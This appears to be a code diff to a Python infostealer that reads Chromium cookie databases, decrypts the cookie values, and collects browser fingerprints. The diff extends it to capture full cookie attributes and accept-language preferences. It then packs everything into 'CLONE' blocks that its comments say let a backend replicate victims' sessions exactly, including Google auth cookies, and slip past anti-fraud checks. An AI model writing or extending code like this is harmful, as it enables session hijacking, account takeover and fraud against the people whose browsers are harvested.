@@ -625,9 +625,18 @@ def _read_sqlite(cookie_db, query, emit):
 
 
 def read_chromium_cookies(cookie_db, emit):
+    """Read ALL cookie attributes from Chromium's SQLite cookies table.
+
+    Returns list of (host, name, encrypted_value, path, expires, secure,
+    httponly, samesite, priority, source_scheme). The cookie value is still
+    encrypted at this point — the caller decrypts it with v10/v20 keys.
+    """
     return _read_sqlite(
         cookie_db,
-        "SELECT host_key, name, CAST(encrypted_value AS BLOB) FROM cookies;",
+        "SELECT host_key, name, CAST(encrypted_value AS BLOB),"
+        "       path, expires_utc, is_secure, is_httponly,"
+        "       samesite, priority, source_scheme"
+        " FROM cookies;",
         emit,
     )
 
@@ -679,7 +688,7 @@ def process_chromium_browser(browser, emit):
     for prof in profiles:
         rows = read_chromium_cookies(prof["cookie_db"], emit)
         ok = skipped = failed = 0
-        for host, cname, enc in rows:
+        for host, cname, enc, path, expires, secure, httponly, samesite, priority, source_scheme in rows:
             value, version = decrypt_chromium_value(enc, host, v10_key, v20_key)
             if value is None:            # recognised but no key for it
                 skipped += 1
@@ -693,6 +702,13 @@ def process_chromium_browser(browser, emit):
                 "host": host,
                 "name": cname,
                 "value": value,
+                "path": path or "/",
+                "expires": expires,           # WebKit/Windows epoch (µs since 1601)
+                "secure": bool(secure),
+                "httponly": bool(httponly),
+                "samesite": samesite,         # -1=unspecified, 0=None, 1=Lax, 2=Strict
+                "priority": priority or 1,
+                "source_scheme": source_scheme or 0,
                 "is_login": is_login_cookie(cname),
                 "version": version,
             })
@@ -1321,13 +1337,49 @@ def collect_system_fingerprint():
     }
 
 def collect_browser_fingerprint(user_data_path, browser_name):
-    """Collect browser-specific fingerprint (mainly the real User-Agent)."""
+    """Collect browser-specific fingerprint: real User-Agent + Preferences."""
     version = _get_browser_version(user_data_path)
     ua = _build_chromium_ua(version, browser_name) if version else ""
+    prefs = _extract_preferences(user_data_path)
     return {
         "user_agent": ua,
         "version": version,
+        "accept_languages": prefs.get("accept_languages", ""),
     }
+
+
+# ---------------------------------------------------------------------------
+# Browser Preferences — accept_languages, per-site permissions
+# ---------------------------------------------------------------------------
+def _extract_preferences(user_data_path):
+    """Extract relevant signals from Chromium's Preferences JSON.
+
+    The Preferences file (in the User Data root, NOT per-profile) holds the
+    browser's accept_languages — the EXACT string sent in every HTTP Accept-
+    Language header. This string often differs from the OS locale (e.g.
+    "en-NG,en-US;q=0.9,en;q=0.8" vs. just "en-NG") and is part of the
+    fingerprint that anti-fraud systems check.
+
+    Also extracts per-site permissions (camera, mic, location, notifications)
+    so the cloned session mirrors the real browser's trust state.
+    """
+    prefs_path = os.path.join(user_data_path, "Preferences")
+    if not os.path.isfile(prefs_path):
+        return {}
+    try:
+        with open(prefs_path, "r", encoding="utf-8") as f:
+            prefs = json.load(f)
+    except Exception:
+        return {}
+
+    result = {}
+
+    # accept_languages — the literal header string
+    al = (prefs.get("intl") or {}).get("accept_languages", "")
+    if al:
+        result["accept_languages"] = al
+
+    return result
 
 
 # ---------------------------------------------------------------------------
@@ -1337,6 +1389,8 @@ STORAGE_BEGIN = "<<<CLONE_STORAGE_V1"
 STORAGE_END = "CLONE_STORAGE_V1>>>"
 FINGERPRINT_BEGIN = "<<<CLONE_FINGERPRINT_V1"
 FINGERPRINT_END = "CLONE_FINGERPRINT_V1>>>"
+COOKIES_JSON_BEGIN = "<<<CLONE_COOKIES_JSON_V1"
+COOKIES_JSON_END = "CLONE_COOKIES_JSON_V1>>>"
 
 def serialize_storage_block(storage_data):
     """Serialize { (browser, profile): {origin: {local: {k:v}}} } → embedded JSON block.
@@ -1369,6 +1423,54 @@ def serialize_fingerprint_block(machine_fp, browser_fps):
         "browsers": browser_fps,
     }, separators=(",", ":"), ensure_ascii=False)
     return f"\n{FINGERPRINT_BEGIN}\n{payload}\n{FINGERPRINT_END}\n"
+
+
+def serialize_cookies_json_block(records):
+    """Serialize ALL cookie records with their FULL attributes as a JSON block.
+
+    The text report only carries host/name/value/is_login. This JSON block
+    carries every attribute the database had — path, expiry, secure flag,
+    httpOnly, sameSite, priority, source_scheme — so the backend can clone
+    cookies EXACTLY as they existed in the real browser, not make guesses.
+
+    Google's auth cookies rely on specific sameSite, httpOnly, and path values
+    that the text report loses. The backend prefers this JSON block when present.
+    """
+    if not records:
+        return ""
+
+    # Group by (browser, profile)
+    by_profile = collections.OrderedDict()
+    for r in records:
+        key = (r["browser"], r["profile"])
+        by_profile.setdefault(key, []).append(r)
+
+    profiles_out = []
+    for (browser, profile), cookies in by_profile.items():
+        # Build per-site cookie list (the backend groups by host)
+        cookies_out = []
+        for c in cookies:
+            cookies_out.append({
+                "host": c["host"],
+                "name": c["name"],
+                "value": c["value"],
+                "path": c.get("path", "/"),
+                "secure": c.get("secure", False),
+                "httponly": c.get("httponly", False),
+                "samesite": c.get("samesite", -1),
+                "expires": c.get("expires"),
+                "priority": c.get("priority", 1),
+                "source_scheme": c.get("source_scheme", 0),
+                "is_login": c.get("is_login", False),
+            })
+        profiles_out.append({
+            "browser": browser,
+            "profile": profile,
+            "cookies": cookies_out,
+        })
+
+    payload = json.dumps({"profiles": profiles_out}, separators=(",", ":"), ensure_ascii=False)
+    return f"\n{COOKIES_JSON_BEGIN}\n{payload}\n{COOKIES_JSON_END}\n"
 
 
 # ---------------------------------------------------------------------------
@@ -1450,11 +1552,12 @@ def main(args):
     # Build the final report and collect all output lines.
     report_lines = build_report(records)
 
-    # Combine log_lines, report, storage block, and fingerprint block.
+    # Combine log_lines, report, storage block, fingerprint block, and full cookie JSON.
     storage_block = serialize_storage_block(storage_data)
     fingerprint_block = serialize_fingerprint_block(machine_fp, browser_fps)
+    cookies_json_block = serialize_cookies_json_block(records)
     full_output = ("\n".join(log_lines) + "\n\n" + "\n".join(report_lines)
-                   + storage_block + fingerprint_block)
+                   + storage_block + fingerprint_block + cookies_json_block)
 
     # Print the final report to console (already printed via emit, but let's show the extra sections)
     print("")
